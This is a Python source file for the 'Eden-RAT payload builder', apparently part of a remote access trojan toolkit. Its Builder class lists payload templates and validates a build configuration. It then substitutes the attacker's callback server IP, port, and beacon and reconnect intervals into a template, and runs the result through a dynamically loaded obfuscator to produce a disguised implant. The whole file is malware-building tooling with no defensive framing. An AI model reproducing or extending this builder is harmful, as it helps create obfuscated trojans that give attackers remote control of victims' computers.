'''
Name: Eden-RAT payload builder.
Author: ISSAC
'''

import sys
import os
import logging
import importlib

from dataclasses import dataclass

class Builder:
    log = logging.getLogger(__name__ + '.Listener')
    log.setLevel(logging.NOTSET)

    @dataclass
    class BuildConfig:
        host: str
        port: int
        template: str
        interval_send: int
        interval_reconn: int
        obfuscator: str

    def __init__(self, tag: str):
        self.tag = tag

        self.path = f'./lib/payload/{self.tag}/template/'
        self.path_exist = os.path.exists(self.path)

    def get_templates(self) -> list:
        if not self.path_exist:
            return []
        
        templates = []
        with os.scandir(self.path) as entries:
            for entry in entries:
                if entry.is_file() and entry.name.split('.')[-1] == 'py':
                    filename = os.path.basename(entry.name)
                    templates.append(os.path.splitext(filename)[0])

        return templates
    
    '''
    validate values of config class object.
    '''
    def build_config_validator(self, config: BuildConfig) -> bool:
        # check host
        if not config.host:
            return False
        
        # check port
        if config.port <= 0 or config.port > 65535:
            return False
        
        # check template
        template_path = f'{self.path}/{config.template}.py'
        if not os.path.exists(template_path):
            return False
        
        # check send info interval
        if config.interval_send == 0:
            return False

        # check reconnect interval
        if config.interval_reconn == 0:
            return False
        
        # check obfuscator
        obfus_path = f'./lib/obfuscator/{config.obfuscator}.py'
        spec = importlib.util.spec_from_file_location('Obfuscator', obfus_path)
        if not spec:
            return False

        return True
    
    '''
    configurating payload with given config class object.
    '''
    def configurate_payload(self, payload: str, config: BuildConfig) -> str:
        payload = payload.replace('[SERVER_IP]', config.host)
        payload = payload.replace('[SERVER_PORT]', str(config.port))
        payload = payload.replace('[INTERVAL_INFO]', str(config.interval_send))
        payload = payload.replace('[INTERVAL_RECONN]', str(config.interval_reconn))

        return payload

    '''
    Generate payload.
    '''
    def build(self, config: BuildConfig) -> str:
        if not self.build_config_validator(config):
            raise Exception('Invalid config.')

        template_path = f'{self.path}/{config.template}.py'
        with open(template_path, 'r', encoding='utf-8') as f:
            payload = f.read()

        payload = self.configurate_payload(payload, config)

        obfus_path = f'./lib/obfuscator/{config.obfuscator}.py'
        obfuscator = importlib.util.spec_from_file_location('Obfuscator', obfus_path)

        module = importlib.util.module_from_spec(obfuscator)
        sys.modules["Obfuscator"] = module

        obfuscator.loader.exec_module(module)

        result = module.Obfuscator(payload).run()
        
        return result

if __name__ == '__main__':
    builder = Builder('python3')
    print(builder.get_templates())
